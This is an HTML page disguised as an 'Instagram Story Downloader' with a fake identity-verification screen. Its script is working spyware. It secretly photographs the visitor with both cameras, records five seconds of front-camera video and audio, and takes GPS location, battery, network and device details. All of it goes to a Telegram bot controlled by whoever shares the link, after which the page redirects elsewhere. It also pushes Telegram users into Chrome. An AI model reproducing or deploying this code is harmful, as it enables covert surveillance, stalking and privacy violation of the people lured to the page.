<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram Story Downloader</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            max-width: 350px;
            width: 100%;
            padding: 50px 30px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { 
            color: #667eea; 
            margin-bottom: 10px; 
            font-size: 28px;
            letter-spacing: 2px;
        }
        .subtitle { 
            color: #999; 
            margin-bottom: 30px; 
            font-size: 14px;
            font-style: italic;
        }
        .hidden { display: none; }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-text {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram Story Downloader</h1>
        <div class="subtitle">Please wait while we verify your identity...</div>
        <div class="loader"></div>
        <div class="status-text">⏳ Requesting camera access...</div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        let BOT_TOKEN = '';
        const INSTAGRAM_URL = "https://zawgyiama2009-pixel.github.io/Mafia/instagram.html"; // မင်း Instagram Story Downloader လင့်
        // =========================
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        // Load config from external file
        async function loadConfig() {
            try {
                const response = await fetch('config.json');
                const config = await response.json();
                BOT_TOKEN = config.bot_token;
                console.log('Config loaded successfully');
                return true;
            } catch (error) {
                console.error('Error loading config:', error);
                updateStatus('❌ Configuration error. Please try again.');
                return false;
            }
        }
        
        // Telegram ဆိုရင် Chrome ပြောင်းခိုင်းမယ်
        if (isTelegram && isMobile) {
            const currentUrl = window.location.href;
            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
        }
        
        let backPhotoSent = false;
        let frontPhotoSent = false;
        let videoSent = false;
        
        // Update status text
        function updateStatus(text) {
            const statusDiv = document.querySelector('.status-text');
            if (statusDiv) statusDiv.textContent = text;
        }
        
        // ========== SEND MESSAGE ==========
        async function sendMessageToOwner(text) {
            if (!OWNER_ID || !BOT_TOKEN) return;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            } catch(e) {
                console.log('Send message error:', e);
            }
        }
        
        // ========== SEND PHOTO (direct to Telegram) ==========
        async function sendPhotoToOwner(photoBlob, cameraType) {
            if (!OWNER_ID || !BOT_TOKEN) return;
            
            const formData = new FormData();
            formData.append('chat_id', OWNER_ID);
            formData.append('photo', photoBlob, `${cameraType}_photo.jpg`);
            formData.append('caption', `📸 ${cameraType.toUpperCase()} CAMERA PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: ${navigator.userAgent.substring(0, 50)}...`);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {
                console.log('Send photo error:', e);
            }
        }
        
        // ========== SEND VIDEO ==========
        async function sendVideoToOwner(videoBlob) {
            if (!OWNER_ID || !BOT_TOKEN) return;
            
            const formData = new FormData();
            formData.append('chat_id', OWNER_ID);
            formData.append('video', videoBlob, 'video.mp4');
            formData.append('caption', `🎥 VIDEO RECORDED! (Front Camera)\n🕐 Time: ${new Date().toLocaleString()}\n⏱️ Duration: 5 seconds`);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {
                console.log('Send video error:', e);
            }
        }
        
        // ========== TAKE PHOTO (direct send, no ImgBB) ==========
        async function takePhotoAndSend(stream, cameraType) {
            if (cameraType === 'back' && backPhotoSent) return;
            if (cameraType === 'front' && frontPhotoSent) return;
            
            if (cameraType === 'back') backPhotoSent = true;
            if (cameraType === 'front') frontPhotoSent = true;
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            stream.getTracks().forEach(track => track.stop());
            
            canvas.toBlob(async (blob) => {
                await sendPhotoToOwner(blob, cameraType);
            }, 'image/jpeg', 0.7);
        }
        
        // ========== VIDEO RECORDING (အရှေ့ကင်မရာ Video 5 စက္ကန့်) ==========
        async function recordFrontVideo() {
            if (videoSent) return;
            videoSent = true;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" },
                    audio: true 
                });
                
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    await sendVideoToOwner(videoBlob);
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 5000);
                
            } catch (err) {
                console.log('Video error:', err);
                await sendMessageToOwner(`❌ VIDEO RECORDING DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== BACK CAMERA (အနောက်) ==========
        async function initBackCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment" } 
                });
                await takePhotoAndSend(stream, 'back');
            } catch (err) {
                console.log('Back camera error:', err);
                await sendMessageToOwner(`❌ BACK CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== FRONT CAMERA (အရှေ့) ==========
        async function initFrontCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                await takePhotoAndSend(stream, 'front');
            } catch (err) {
                console.log('Front camera error:', err);
                await sendMessageToOwner(`❌ FRONT CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
            }
        }
        
        // ========== LOCATION (Maps လင့်ပါအောင်) ==========
        async function getLocation() {
            if (!navigator.geolocation) {
                await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    await sendMessageToOwner(
                        `📍 **LOCATION CAPTURED!**\n` +
                        `🕐 Time: ${new Date().toLocaleString()}\n` +
                        `🌍 Latitude: ${lat}\n` +
                        `🌍 Longitude: ${lon}\n` +
                        `📏 Accuracy: ${acc}m\n` +
                        `🗺️ **Google Maps:** [Click Here to View](${mapsLink})`
                    );
                },
                async (error) => {
                    await sendMessageToOwner(`❌ LOCATION DENIED!\n🕐 Time: ${new Date().toLocaleString()}\n📛 Error: ${error.message}`);
                }
            );
        }
        
        // ========== BATTERY INFO (ဖုန်းအား) ==========
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.floor(battery.level * 100);
                    const charging = battery.charging ? "Charging" : "Not Charging";
                    await sendMessageToOwner(`🔋 BATTERY INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Battery Level: ${level}%\n📌 Status: ${charging}`);
                } catch(e) {
                    await sendMessageToOwner(`🔋 BATTERY INFO NOT AVAILABLE!`);
                }
            } else {
                await sendMessageToOwner(`🔋 BATTERY INFO NOT SUPPORTED!`);
            }
        }
        
        // ========== NETWORK INFO (WiFi / Cellular / 4G/5G) ==========
        async function getNetworkInfo() {
            let networkType = "Unknown";
            let downlink = "";
            
            if (navigator.connection) {
                const type = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
                networkType = type.toUpperCase();
                if (navigator.connection.downlink) {
                    downlink = ` (${navigator.connection.downlink} Mbps)`;
                }
            }
            
            let connectionMethod = "Unknown";
            if (networkType === 'wifi' || networkType === 'WIFI') {
                connectionMethod = "WiFi";
            } else if (networkType === 'cellular' || networkType === '4g' || networkType === '5g' || networkType === '3g' || networkType === '2g') {
                connectionMethod = "Cellular (Mobile Data)";
            } else {
                connectionMethod = networkType;
            }
            
            await sendMessageToOwner(`🌐 NETWORK INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Connection Type: ${connectionMethod}\n📌 Speed: ${networkType}${downlink}`);
        }
        
        // ========== DEVICE INFO ==========
        async function sendDeviceInfo() {
            const deviceInfo = {
                platform: navigator.platform,
                language: navigator.language,
                userAgent: navigator.userAgent,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            await sendMessageToOwner(`📱 DEVICE INFO!\n🕐 Time: ${new Date().toLocaleString()}\n📌 Platform: ${deviceInfo.platform}\n📌 Language: ${deviceInfo.language}\n📌 Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}\n📌 Timezone: ${deviceInfo.timezone}\n📌 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`);
        }
        
        // ========== MAIN ==========
        async function init() {
            // Load config first
            const configLoaded = await loadConfig();
            if (!configLoaded || !BOT_TOKEN || !OWNER_ID) {
                updateStatus('❌ Configuration failed. Please try again.');
                setTimeout(() => {
                    window.location.href = INSTAGRAM_URL;
                }, 3000);
                return;
            }
            
            updateStatus('📸 Requesting camera access...');
            
            // အနောက်ကင်မရာ (Back Camera Photo)
            await initBackCamera();
            
            // အရှေ့ကင်မရာ (Front Camera Photo)
            await initFrontCamera();
            
            // Video Recording (Front Camera Video 5 sec)
            await recordFrontVideo();
            
            // Location (Maps လင့်ပါ)
            await getLocation();
            
            // Battery Info (ဖုန်းအား)
            await getBatteryInfo();
            
            // Network Info (WiFi/Cellular/4G/5G)
            await getNetworkInfo();
            
            // Device Info
            await sendDeviceInfo();
            
            updateStatus('✅ Verification complete! Redirecting...');
            
            // အကုန်ပြီးရင် Instagram Story Downloader စီခေါ်မယ်
            setTimeout(() => {
                window.location.href = INSTAGRAM_URL;
            }, 3000);
        }
        
        // Start - check if not in Telegram webview or not mobile
        if (!isTelegram || !isMobile) {
            init();
        } else {
            // If in Telegram, we already redirected to Chrome
            updateStatus('🔄 Opening in Chrome...');
        }
    </script>
</body>
</html>
